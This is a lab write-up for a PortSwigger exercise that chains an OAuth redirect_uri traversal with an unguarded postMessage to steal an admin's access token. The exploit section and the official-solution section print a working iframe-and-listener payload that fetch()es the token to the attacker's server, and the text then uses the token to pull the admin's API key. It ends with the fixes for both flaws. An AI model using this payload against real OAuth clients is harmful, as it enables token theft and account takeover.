# Stealing OAuth access tokens via a proxy page

**Category:** OAuth authentication
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page

An open redirect isn't the only way a fragment-carried access token can leak off a page that never
meant to expose it. `postMessage()` is the standard mechanism for one window to talk to another
across origins, and it's safe exactly to the extent that both the sender restricts *what* it sends
and the receiver restricts *who* it listens to. This lab's client application gets the first half
wrong — a page sends its own full URL, fragment included, to any parent window that will listen —
which turns an entirely unrelated iframe embed into an access-token proxy.

## The Target

Same `redirect_uri` traversal weakness as the previous lab — the OAuth provider accepts a value
starting with the whitelisted callback and lets `/../` resolve past it — but this lab's client app
has no open redirect to chain it to. Instead, blog posts embed a comment form as an iframe at
`/post/comment/comment-form`, and that comment form's own JavaScript does this on load:

```javascript
parent.postMessage({type: 'onload', data: window.location.href}, '*')
```

Blog post pages, in turn, already listen for `message` events to handle `oncomment` notifications
from that same iframe.

## The Investigation

We already understood the traversal mechanics from the open-redirect lab — the interesting question
here was whether there was *any* other page on the client's origin that could be reached by the same
`/../` trick and would leak a fragment somewhere observable, since this lab has no navigation feature
that redirects off-site. Auditing the comment form's source turned up the `postMessage` call above,
and two details about it mattered immediately: it sends `window.location.href` — which, loaded via
the traversed `redirect_uri`, would include `#access_token=TOKEN` — and it targets origin `'*'`,
meaning it will hand that URL to literally any parent window, regardless of what origin embedded the
iframe.

That second detail is what makes this exploitable without an open redirect. We don't need the
browser to navigate anywhere else at all — we just need our own page, on our own origin, to be the
one that put the traversed OAuth URL in an iframe in the first place. Since we control the parent,
we already have a listener in place to receive whatever the child posts, no matter what origin the
child claims to be. The redirect target isn't the exploit server this time; it's straight back to the
comment form on the client's own origin, and the leak happens through the message channel instead of
a navigation.

## The Exploit

The traversed `redirect_uri` this time pointed at the comment form rather than an open redirect:

```
redirect_uri=https://LAB/oauth-callback/../post/comment/comment-form
```

We built the exploit page as an iframe loading the crafted authorization URL directly, with a
message listener sitting alongside it:

```html
<iframe src="AUTH_URL"></iframe>
<script>
window.addEventListener('message', function(e) {
    if (e.data.data) {
        fetch('/' + encodeURIComponent(e.data.data));
    }
}, false);
</script>
```

When the admin's browser (with its active OAuth session) loads this, the iframe walks through
authorization automatically and lands on the comment form with `#access_token=TOKEN` in its URL. The
comment form's own script fires `parent.postMessage({data: window.location.href}, '*')` — and because
our exploit page is genuinely the parent window this time (there's no intermediate redirect breaking
that relationship, unlike the previous lab's two-phase approach), the message arrives directly at our
listener. We `fetch()` the full URL-encoded value straight back to our own server's access log. No
two-phase dance was needed here — keeping the exploit page as the iframe's actual parent throughout
was enough for `postMessage` to deliver the token to us in one hop.

The token showed up URL-encoded in the log (`access_token%3DTOKEN`), so we decoded it before use.
From there the process matched the previous lab exactly: `GET /me` on the OAuth provider with
`Authorization: Bearer TOKEN` returned the admin's API key, submitted to solve.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution identifies the same two pieces — the `redirect_uri` traversal and the
unguarded `postMessage` in the comment form — and assembles essentially the same payload:

```
<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
```

```javascript
window.addEventListener('message', function(e) { fetch("/" + encodeURIComponent(e.data.data)) }, false)
```

That listener code is functionally identical to ours — same `fetch('/' + encodeURIComponent(...))`
construction reading `e.data.data`. This is one of the closest matches in the whole series: the
mechanism, the payload shape, and even the specific JavaScript idiom for exfiltrating the message
data all line up. The divergence is entirely in tooling — PortSwigger's walkthrough builds and tests
the iframe through the exploit server's web GUI and confirms the leak by watching Burp's access log
update, one deliberate step at a time given how many moving parts (traversal, iframe, postMessage,
listener) have to work together. We wired the same pieces together as a single Python script: POST
the HTML payload to the exploit server's storage endpoint, trigger delivery, then poll the access log
with a regex against the URL-decoded response.

## What This Teaches Us

`postMessage(data, '*')` is the wildcard-origin equivalent of a `redirect_uri` that accepts anything:
it works exactly as intended for every legitimate embedder and every attacker at the same time,
because it makes no distinction between them. The comment form's mistake wasn't sending
`window.location.href` — plenty of pages report their own URL to a parent for legitimate reasons —
it was doing so without checking that the parent asking for it was actually the blog's own trusted
origin. Fix either half of this chain and the exploit collapses: pin `redirect_uri` to an exact
match and the traversal never reaches the comment form at all; pin `postMessage`'s target origin to
the specific parent the form expects and even a successfully traversed fragment never reaches an
attacker's listener. This lab earning the "Expert" label over its open-redirect sibling comes down
to exactly that — recognizing a *second*, non-obvious way for a fragment to leave the page once the
first one (navigation) isn't available.
